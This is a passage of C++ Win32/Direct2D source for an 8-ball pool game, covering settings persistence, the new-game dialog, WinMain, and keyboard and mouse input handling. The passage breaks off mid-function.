    bool IsPathClear(D2D1_POINT_2F start, D2D1_POINT_2F end, int ignoredBallId1, int ignoredBallId2);
    Ball* FindFirstHitBall(D2D1_POINT_2F start, float angle, float& hitDistSq); // Added hitDistSq output
    float CalculateShotPower(float cueToGhostDist, float targetToPocketDist);
    D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex);
    bool IsValidAIAimAngle(float angle); // Basic check

    // Dialog Related
    INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
    void ShowNewGameDialog(HINSTANCE hInstance);
    void LoadSettings(); // For deserialization
    void SaveSettings(); // For serialization
    const std::wstring SETTINGS_FILE_NAME = L""Pool-Settings.txt"";
    void ResetGame(HINSTANCE hInstance); // Function to handle F2 reset

    // --- Forward Declaration for Window Procedure --- <<< Add this line HERE
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

    // --- NEW Struct for AI Shot Evaluation ---
    struct AIShotInfo {
        bool possible = false;          // Is this shot considered viable?
        Ball* targetBall = nullptr;     // Which ball to hit
        int pocketIndex = -1;           // Which pocket to aim for (0-5)
        D2D1_POINT_2F ghostBallPos = { 0,0 }; // Where cue ball needs to hit target ball
        float angle = 0.0f;             // Calculated shot angle
        float power = 0.0f;             // Calculated shot power
        float score = -1.0f;            // Score for this shot (higher is better)
        bool involves8Ball = false;     // Is the target the 8-ball?
        float spinX = 0.0f;
        float spinY = 0.0f;
    };

    /*
    table = TABLE_COLOR new: #29662d (0.1608, 0.4000, 0.1765) => old: (0.0f, 0.5f, 0.1f)
    rail CUSHION_COLOR = #5c0702 (0.3608, 0.0275, 0.0078) => ::Red
    gap = #e99d33 (0.9157, 0.6157, 0.2000) => ::Orange
    winbg = #5e8863 (0.3686, 0.5333, 0.3882) => 1.0f, 1.0f, 0.803f
    headstring = #47742f (0.2784, 0.4549, 0.1843) => ::White
    bluearrow = #08b0a5 (0.0314, 0.6902, 0.6471) *#22babf (0.1333,0.7294,0.7490) => ::Blue
    */

    // --- NEW Settings Serialization Functions ---
    void SaveSettings() {
        std::ofstream outFile(SETTINGS_FILE_NAME);
        if (outFile.is_open()) {
            outFile << static_cast<int>(gameMode) << std::endl;
            outFile << static_cast<int>(aiDifficulty) << std::endl;
            outFile << static_cast<int>(openingBreakMode) << std::endl;
            outFile.close();
        }
        // else: Handle error, e.g., log or silently fail
    }

    void LoadSettings() {
        std::ifstream inFile(SETTINGS_FILE_NAME);
        if (inFile.is_open()) {
            int gm, aid, obm;
            if (inFile >> gm) {
                gameMode = static_cast<GameMode>(gm);
            }
            if (inFile >> aid) {
                aiDifficulty = static_cast<AIDifficulty>(aid);
            }
            if (inFile >> obm) {
                openingBreakMode = static_cast<OpeningBreakMode>(obm);
            }
            inFile.close();

            // Validate loaded settings (optional, but good practice)
            if (gameMode < HUMAN_VS_HUMAN || gameMode > HUMAN_VS_AI) gameMode = HUMAN_VS_HUMAN; // Default
            if (aiDifficulty < EASY || aiDifficulty > HARD) aiDifficulty = MEDIUM; // Default
            if (openingBreakMode < CPU_BREAK || openingBreakMode > FLIP_COIN_BREAK) openingBreakMode = CPU_BREAK; // Default
        }
        // else: File doesn't exist or couldn't be opened, use defaults (already set in global vars)
    }
    // --- End Settings Serialization Functions ---

    // --- NEW Dialog Procedure ---
    INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
        switch (message) {
        case WM_INITDIALOG:
        {
            // --- ACTION 4: Center Dialog Box ---
    // Optional: Force centering if default isn't working
            RECT rcDlg, rcOwner, rcScreen;
            HWND hwndOwner = GetParent(hDlg); // GetParent(hDlg) might be better if hwndMain is passed
            if (hwndOwner == NULL) hwndOwner = GetDesktopWindow();

            GetWindowRect(hwndOwner, &rcOwner);
            GetWindowRect(hDlg, &rcDlg);
            CopyRect(&rcScreen, &rcOwner); // Use owner rect as reference bounds

            // Offset the owner rect relative to the screen if it's not the desktop
            if (GetParent(hDlg) != NULL) { // If parented to main window (passed to DialogBoxParam)
                OffsetRect(&rcOwner, -rcScreen.left, -rcScreen.top);
                OffsetRect(&rcDlg, -rcScreen.left, -rcScreen.top);
                OffsetRect(&rcScreen, -rcScreen.left, -rcScreen.top);
            }


            // Calculate centered position
            int x = rcOwner.left + (rcOwner.right - rcOwner.left - (rcDlg.right - rcDlg.left)) / 2;
            int y = rcOwner.top + (rcOwner.bottom - rcOwner.top - (rcDlg.bottom - rcDlg.top)) / 2;

            // Ensure it stays within screen bounds (optional safety)
            x = std::max(static_cast<int>(rcScreen.left), x);
            y = std::max(static_cast<int>(rcScreen.top), y);
            if (x + (rcDlg.right - rcDlg.left) > rcScreen.right)
                x = rcScreen.right - (rcDlg.right - rcDlg.left);
            if (y + (rcDlg.bottom - rcDlg.top) > rcScreen.bottom)
                y = rcScreen.bottom - (rcDlg.bottom - rcDlg.top);


            // Set the dialog position
            SetWindowPos(hDlg, HWND_TOP, x, y, 0, 0, SWP_NOSIZE);

            // --- End Centering Code ---

            // Set initial state based on current global settings (or defaults)
            CheckRadioButton(hDlg, IDC_RADIO_2P, IDC_RADIO_CPU, (gameMode == HUMAN_VS_HUMAN) ? IDC_RADIO_2P : IDC_RADIO_CPU);

            CheckRadioButton(hDlg, IDC_RADIO_EASY, IDC_RADIO_HARD,
                (aiDifficulty == EASY) ? IDC_RADIO_EASY : ((aiDifficulty == MEDIUM) ? IDC_RADIO_MEDIUM : IDC_RADIO_HARD));

            // Enable/Disable AI group based on initial mode
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), gameMode == HUMAN_VS_AI);
            // Set initial state for Opening Break Mode
            CheckRadioButton(hDlg, IDC_RADIO_CPU_BREAK, IDC_RADIO_FLIP_BREAK,
                (openingBreakMode == CPU_BREAK) ? IDC_RADIO_CPU_BREAK : ((openingBreakMode == P1_BREAK) ? IDC_RADIO_P1_BREAK : IDC_RADIO_FLIP_BREAK));
            // Enable/Disable Opening Break group based on initial mode
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_BREAK_MODE), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_CPU_BREAK), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_P1_BREAK), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_FLIP_BREAK), gameMode == HUMAN_VS_AI);
        }
        return (INT_PTR)TRUE;

        case WM_COMMAND:
            switch (LOWORD(wParam)) {
            case IDC_RADIO_2P:
            case IDC_RADIO_CPU:
            {
                bool isCPU = IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED;
                // Enable/Disable AI group controls based on selection
                EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), isCPU);
                // Also enable/disable Opening Break Mode group
                EnableWindow(GetDlgItem(hDlg, IDC_GROUP_BREAK_MODE), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_CPU_BREAK), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_P1_BREAK), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_FLIP_BREAK), isCPU);
            }
            return (INT_PTR)TRUE;

            case IDOK:
                // Retrieve selected options and store in global variables
                if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED) {
                    gameMode = HUMAN_VS_AI;
                    if (IsDlgButtonChecked(hDlg, IDC_RADIO_EASY) == BST_CHECKED) aiDifficulty = EASY;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_MEDIUM) == BST_CHECKED) aiDifficulty = MEDIUM;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_HARD) == BST_CHECKED) aiDifficulty = HARD;

                    if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU_BREAK) == BST_CHECKED) openingBreakMode = CPU_BREAK;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_P1_BREAK) == BST_CHECKED) openingBreakMode = P1_BREAK;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_FLIP_BREAK) == BST_CHECKED) openingBreakMode = FLIP_COIN_BREAK;
                }
                else {
                    gameMode = HUMAN_VS_HUMAN;
                    // openingBreakMode doesn't apply to HvsH, can leave as is or reset
                }
                SaveSettings(); // Save settings when OK is pressed
                EndDialog(hDlg, IDOK); // Close dialog, return IDOK
                return (INT_PTR)TRUE;

            case IDCANCEL: // Handle Cancel or closing the dialog
                // Optionally, could reload settings here if you want cancel to revert to previously saved state
                EndDialog(hDlg, IDCANCEL);
                return (INT_PTR)TRUE;
            }
            break; // End WM_COMMAND
        }
        return (INT_PTR)FALSE; // Default processing
    }

    // --- NEW Helper to Show Dialog ---
    void ShowNewGameDialog(HINSTANCE hInstance) {
        if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), hwndMain, NewGameDialogProc, 0) == IDOK) {
            // User clicked Start, reset game with new settings
            isPlayer2AI = (gameMode == HUMAN_VS_AI); // Update AI flag
            if (isPlayer2AI) {
                switch (aiDifficulty) {
                case EASY: player2Info.name = L""Virtus Pro (Easy)""/*""CPU (Easy)""*/; break;
                case MEDIUM: player2Info.name = L""Virtus Pro (Medium)""/*""CPU (Medium)""*/; break;
                case HARD: player2Info.name = L""Virtus Pro (Hard)""/*""CPU (Hard)""*/; break;
                }
            }
            else {
                player2Info.name = L""Billy Ray Cyrus""/*""Player 2""*/;
            }
            // Update window title
            std::wstring windowTitle = L""Midnight Pool 4""/*""Direct2D 8-Ball Pool""*/;
            if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
            else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";
            SetWindowText(hwndMain, windowTitle.c_str());

            InitGame(); // Re-initialize game logic & board
            InvalidateRect(hwndMain, NULL, TRUE); // Force redraw
        }
        else {
            // User cancelled dialog - maybe just resume game? Or exit?
            // For simplicity, we do nothing, game continues as it was.
            // To exit on cancel from F2, would need more complex state management.
        }
    }

    // --- NEW Reset Game Function ---
    void ResetGame(HINSTANCE hInstance) {
        // Call the helper function to show the dialog and re-init if OK clicked
        ShowNewGameDialog(hInstance);
    }

    // --- WinMain ---
    int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int nCmdShow) {
        if (FAILED(CoInitialize(NULL))) {
            MessageBox(NULL, L""COM Initialization Failed."", L""Error"", MB_OK | MB_ICONERROR);
            return -1;
        }

        // --- NEW: Load settings at startup ---
        LoadSettings();

        // --- NEW: Show configuration dialog FIRST ---
        if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), NULL, NewGameDialogProc, 0) != IDOK) {
            // User cancelled the dialog
            CoUninitialize();
            return 0; // Exit gracefully if dialog cancelled
        }
        // Global gameMode and aiDifficulty are now set by the DialogProc

        // Set AI flag based on game mode
        isPlayer2AI = (gameMode == HUMAN_VS_AI);
        if (isPlayer2AI) {
            switch (aiDifficulty) {
            case EASY: player2Info.name = L""Virtus Pro (Easy)""/*""CPU (Easy)""*/; break;
            case MEDIUM:player2Info.name = L""Virtus Pro (Medium)""/*""CPU (Medium)""*/; break;
            case HARD: player2Info.name = L""Virtus Pro (Hard)""/*""CPU (Hard)""*/; break;
            }
        }
        else {
            player2Info.name = L""Billy Ray Cyrus""/*""Player 2""*/;
        }
        // --- End of Dialog Logic ---


        WNDCLASS wc = { };
        wc.lpfnWndProc = WndProc;
        wc.hInstance = hInstance;
        wc.lpszClassName = L""BLISS_GameEngine""/*""Direct2D_8BallPool""*/;
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)); // Use your actual icon ID here

        if (!RegisterClass(&wc)) {
            MessageBox(NULL, L""Window Registration Failed."", L""Error"", MB_OK | MB_ICONERROR);
            CoUninitialize();
            return -1;
        }

        // --- ACTION 4: Calculate Centered Window Position ---
        const int WINDOW_WIDTH = 1000; // Define desired width
        const int WINDOW_HEIGHT = 700; // Define desired height
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        int windowX = (screenWidth - WINDOW_WIDTH) / 2;
        int windowY = (screenHeight - WINDOW_HEIGHT) / 2;

        // --- Change Window Title based on mode ---
        std::wstring windowTitle = L""Midnight Pool 4""/*""Direct2D 8-Ball Pool""*/;
        if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
        else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";

        DWORD dwStyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX; // No WS_THICKFRAME, No WS_MAXIMIZEBOX

        hwndMain = CreateWindowEx(
            0, L""BLISS_GameEngine""/*""Direct2D_8BallPool""*/, windowTitle.c_str(), dwStyle,
            windowX, windowY, WINDOW_WIDTH, WINDOW_HEIGHT,
            NULL, NULL, hInstance, NULL
        );

        if (!hwndMain) {
            MessageBox(NULL, L""Window Creation Failed."", L""Error"", MB_OK | MB_ICONERROR);
            CoUninitialize();
            return -1;
        }

        // Initialize Direct2D Resources AFTER window creation
        if (FAILED(CreateDeviceResources())) {
            MessageBox(NULL, L""Failed to create Direct2D resources."", L""Error"", MB_OK | MB_ICONERROR);
            DestroyWindow(hwndMain);
            CoUninitialize();
            return -1;
        }

        InitGame(); // Initialize game state AFTER resources are ready & mode is set
        Sleep(500); // Allow window to fully initialize before starting the countdown //midi func
        StartMidi(hwndMain, TEXT(""BSQ.MID"")); // Replace with your MIDI filename
        //PlayGameMusic(hwndMain); //midi func

        ShowWindow(hwndMain, nCmdShow);
        UpdateWindow(hwndMain);

        if (!SetTimer(hwndMain, ID_TIMER, 1000 / TARGET_FPS, NULL)) {
            MessageBox(NULL, L""Could not SetTimer()."", L""Error"", MB_OK | MB_ICONERROR);
            DestroyWindow(hwndMain);
            CoUninitialize();
            return -1;
        }

        MSG msg = { };
        // --- Modified Main Loop ---
        // Handles the case where the game starts in SHOWING_DIALOG state (handled now before loop)
        // or gets reset to it via F2. The main loop runs normally once game starts.
        while (GetMessage(&msg, NULL, 0, 0)) {
            // We might need modeless dialog handling here if F2 shows dialog
            // while window is active, but DialogBoxParam is modal.
            // Let's assume F2 hides main window, shows dialog, then restarts game loop.
            // Simpler: F2 calls ResetGame which calls DialogBoxParam (modal) then InitGame.
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }


        KillTimer(hwndMain, ID_TIMER);
        DiscardDeviceResources();
        SaveSettings(); // Save settings on exit
        CoUninitialize();

        return (int)msg.wParam;
    }

    // --- WndProc ---
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
        // Declare cueBall pointer once at the top, used in multiple cases
        // For clarity, often better to declare within each case where needed.
        Ball* cueBall = nullptr; // Initialize to nullptr
        switch (msg) {
        case WM_CREATE:
            // Resources are now created in WinMain after CreateWindowEx
            return 0;

        case WM_PAINT:
            OnPaint();
            // Validate the entire window region after painting
            ValidateRect(hwnd, NULL);
            return 0;

        case WM_SIZE: {
            UINT width = LOWORD(lParam);
            UINT height = HIWORD(lParam);
            OnResize(width, height);
            return 0;
        }

        case WM_TIMER:
            if (wParam == ID_TIMER) {
                GameUpdate(); // Update game logic and physics
                InvalidateRect(hwnd, NULL, FALSE); // Request redraw
            }
            return 0;

            // --- NEW: Handle F2 Key for Reset ---
            // --- MODIFIED: Handle More Keys ---
        case WM_KEYDOWN:
        { // Add scope for variable declarations

            // --- FIX: Get Cue Ball pointer for this scope ---
            cueBall = GetCueBall();
            // We might allow some keys even if cue ball is gone (like F1/F2), but actions need it
            // --- End Fix ---

            // Check which player can interact via keyboard (Humans only)
            bool canPlayerControl = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P1 || currentGameState == PRE_BREAK_PLACEMENT)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT)));

            // --- F1 / F2 Keys (Always available) ---
            if (wParam == VK_F2) {
                HINSTANCE hInstance = (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE);
                ResetGame(hInstance); // Call reset function
                return 0; // Indicate key was processed
            }
            else if (wParam == VK_F1) {
                MessageBox(hwnd,
                    L""Direct2D-based StickPool game made in C++ from scratch (4827+ lines of code)\n"" // Update line count if needed {2764+ lines}
                    L""First successful Clone in C++ (no other sites or projects were there to glean from.) Made /w AI assist\n""
                    L""(others were in JS/ non-8-Ball in C# etc.) w/o OOP and Graphics Frameworks all in a Single file.\n""
                    L""Copyright (C) 2025 Evans Thorpemorton, Entisoft Solutions.\n""
                    L""Includes AI Difficulty Modes, Aim-Trajectory For Table Rails + Hard Angles TipShots. || F2=New Game"",
                    L""About This Game"", MB_OK | MB_ICONINFORMATION);
                return 0; // Indicate key was processed
            }

            // Check for 'M' key (uppercase or lowercase)
                // Toggle music with ""M""
            if (wParam == 'M' || wParam == 'm') {
                //static bool isMusicPlaying = false;
                if (isMusicPlaying) {
                    // Stop the music
                    StopMidi();
                    isMusicPlaying = false;
                }
                else {
                    // Build the MIDI file path
                    TCHAR midiPath[MAX_PATH];
                    GetModuleFileName(NULL, midiPath, MAX_PATH);
                    // Keep only the directory part
                    TCHAR* lastBackslash = _tcsrchr(midiPath, '\\');
                    if (lastBackslash != NULL) {
                        *(lastBackslash + 1) = '\0';
                    }
                    // Append the MIDI filename
                    _tcscat_s(midiPath, MAX_PATH, TEXT(""BSQ.MID"")); // Adjust filename if needed

                    // Start playing MIDI
                    StartMidi(hwndMain, midiPath);
                    isMusicPlaying = true;
                }
            }


            // --- Player Interaction Keys (Only if allowed) ---
            if (canPlayerControl) {
                // --- Get Shift Key State ---
                bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                float angleStep = shiftPressed ? 0.05f : 0.01f; // Base step / Faster step (Adjust as needed) // Multiplier was 5x
                float powerStep = 0.2f; // Power step (Adjust as needed)

                switch (wParam) {
                case VK_LEFT: // Rotate Cue Stick Counter-Clockwise
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        cueAngle -= angleStep;
                        // Normalize angle (keep between 0 and 2*PI)
                        if (cueAngle < 0) cueAngle += 2 * PI;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = false; // Keyboard adjust doesn't use mouse aiming state
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_RIGHT: // Rotate Cue Stick Clockwise
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        cueAngle += angleStep;
                        // Normalize angle (keep between 0 and 2*PI)
                        if (cueAngle >= 2 * PI) cueAngle -= 2 * PI;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = false;
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_UP: // Decrease Shot Power
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        shotPower -= powerStep;
                        if (shotPower < 0.0f) shotPower = 0.0f;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = true; // Keyboard adjust doesn't use mouse aiming state
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_DOWN: // Increase Shot Power
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        shotPower += powerStep;
                        if (shotPower > MAX_SHOT_POWER) shotPower = MAX_SHOT_POWER;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = true;
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_SPACE: // Trigger Shot
                    if ((currentGameState == AIMING || currentGameState == BREAKING || currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                        && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING)
                    {
                        if (shotPower > 0.15f) { // Use same threshold as mouse
                           // Reset foul flags BEFORE applying shot
                            firstHitBallIdThisShot = -1;
                            cueHitObjectBallThisShot = false;
                            railHitAfterContact = false;

                            // Play sound & Apply Shot
                            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                            ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);

                            // Update State
                            currentGameState = SHOT_IN_PROGRESS;
                            foulCommitted = false;
                            pocketedThisTurn.clear();
                            shotPower = 0; // Reset power after shooting
                            isAiming = false; isDraggingStick = false; // Reset aiming flags
                            keyboardAimingActive = false;
                        }
                    }
                    break;

                case VK_ESCAPE: // Cancel Aim/Shot Setup
                    if ((currentGameState == AIMING || currentGameState == BREAKING) || shotPower > 0)
                    {
                        shotPower = 0.0f;
                        isAiming = false;
                        isDraggingStick = false;
                        keyboardAimingActive = false;
                        // Revert to basic turn state if not breaking
                        if (currentGameState != BREAKING) {
                            currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        }
                        //if (currentPlayer == 1) calledPocketP1 = -1;
                        //else                  calledPocketP2 = -1;
                    }
                    break;

                case 'G': // Toggle Cheat Mode
                    cheatModeEnabled = !cheatModeEnabled;
                    if (cheatModeEnabled)
                        MessageBeep(MB_ICONEXCLAMATION); // Play a beep when enabling
                    else
                        MessageBeep(MB_OK); // Play a different beep when disabling
                    break;

                default:
                    // Allow default processing for other keys if needed
                    // return DefWindowProc(hwnd, msg, wParam, lParam); // Usually not needed for WM_KEYDOWN
                    break;
                } // End switch(wParam) for player controls
                return 0; // Indicate player control key was processed
            } // End if(canPlayerControl)
        } // End scope for WM_KEYDOWN case
        // If key wasn't F1/F2 and player couldn't control, maybe allow default processing?
        // return DefWindowProc(hwnd, msg, wParam, lParam); // Or just return 0
        return 0;

        case WM_MOUSEMOVE: {
            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            // --- NEW LOGIC: Handle Pocket Hover ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {
                int oldHover = currentlyHoveredPocket;
                currentlyHoveredPocket = -1; // Reset
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        currentlyHoveredPocket = i;
                        break;
                    }
                }
                if (oldHover != currentlyHoveredPocket) {
                    InvalidateRect(hwnd, NULL, FALSE);
                }
                // Do NOT return 0 here, allow normal mouse angle update to continue
            }
            // --- END NEW LOGIC ---


            cueBall = GetCueBall(); // Declare and get cueBall pointer

            if (isDraggingCueBall && cheatModeEnabled && draggingBallId != -1) {
                Ball* ball = GetBallById(draggingBallId);
                if (ball) {
                    ball->x = (float)ptMouse.x;
                    ball->y = (float)ptMouse.y;
                    ball->vx = ball->vy = 0.0f;
                }
                return 0;
            }

            if (!cueBall) return 0;

            // Update Aiming Logic (Check player turn)
            if (isDraggingCueBall &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (!isPlayer2AI && currentPlayer == 2 && currentGameState == BALL_IN_HAND_P2) ||
                    currentGameState == PRE_BREAK_PLACEMENT))
            {
                bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                // Tentative position update
                cueBall->x = (float)ptMouse.x;
                cueBall->y = (float)ptMouse.y;
                cueBall->vx = cueBall->vy = 0;
            }
            else if ((isAiming || isDraggingStick) &&
                ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
            {
                //NEW2 MOUSEBOUND CODE = START
                    /*// Clamp mouse inside table bounds during aiming
                    if (ptMouse.x < TABLE_LEFT) ptMouse.x = TABLE_LEFT;
                if (ptMouse.x > TABLE_RIGHT) ptMouse.x = TABLE_RIGHT;
                if (ptMouse.y < TABLE_TOP) ptMouse.y = TABLE_TOP;
                if (ptMouse.y > TABLE_BOTTOM) ptMouse.y = TABLE_BOTTOM;*/
                //NEW2 MOUSEBOUND CODE = END
                // Aiming drag updates angle and power
                float dx = (float)ptMouse.x - cueBall->x;
                float dy = (float)ptMouse.y - cueBall->y;
                if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                //float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                //shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
                if (!keyboardAimingActive) { // Only update shotPower if NOT keyboard aiming
                    float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                    shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
                }
            }
            else if (isSettingEnglish &&
                ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING))))
            {
                // Setting English
                float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                float dist = GetDistance(dx, dy, 0, 0);
                if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                cueSpinX = dx / spinIndicatorRadius;
                cueSpinY = dy / spinIndicatorRadius;
            }
            else {
                //DISABLE PERM AIMING = START
                /*// Update visual angle even when not aiming/dragging (Check player turn)
                bool canUpdateVisualAngle = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BALL_IN_HAND_P1)) ||
                    (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BALL_IN_HAND_P2)) ||
                    currentGameState == PRE_BREAK_PLACEMENT || currentGameState == BREAKING || currentGameState == AIMING);

                if (canUpdateVisualAngle && !isDraggingCueBall && !isAiming && !isDraggingStick && !keyboardAimingActive) // NEW: Prevent mouse override if keyboard aiming
                {
                    // NEW MOUSEBOUND CODE = START
                        // Only update cue angle if mouse is inside the playable table area
                    if (ptMouse.x >= TABLE_LEFT && ptMouse.x <= TABLE_RIGHT &&
                        ptMouse.y >= TABLE_TOP && ptMouse.y <= TABLE_BOTTOM)
                    {
                        // NEW MOUSEBOUND CODE = END
                        Ball* cb = cueBall; // Use function-scope cueBall // Already got cueBall above
                        if (cb) {
                            float dx = (float)ptMouse.x - cb->x;
                            float dy = (float)ptMouse.y - cb->y;
                            if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                        }
                    } //NEW MOUSEBOUND CODE LINE = DISABLE
                }*/
                //DISABLE PERM AIMING = END
            }
            return 0;
        } // End WM_MOUSEMOVE

        case WM_LBUTTONDOWN: {
            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            // --- FOOLPROOF FIX: This block implements the two-stage pocket selection ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // STAGE 1, STEP 1: Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) {
                    // STAGE 1, STEP 2: Player clicked on a pocket. Update the choice.
                    // We DO NOT change the game state here. This allows re-selection.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show the arrow has moved.
                    return 0; // Consume the click and stay in CHOOSING_POCKET state.
                }

                // STAGE 2, STEP 1: Check if the player is clicking the cue ball to confirm.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
